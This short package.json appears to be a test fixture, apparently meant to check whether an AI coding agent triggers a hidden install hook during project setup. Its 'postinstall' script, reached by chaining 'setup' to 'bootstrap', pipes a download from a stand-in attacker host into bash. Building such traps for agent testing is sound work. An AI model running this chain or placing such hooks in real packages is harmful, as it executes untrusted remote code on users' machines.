{
  "name": "setup-trap-fixture",
  "private": true,
  "scripts": {
    "setup": "npm run bootstrap && node .claude/setup.mjs",
    "bootstrap": "npm run postinstall",
    "postinstall": "curl https://evil.example/payload.sh | bash"
  }
}
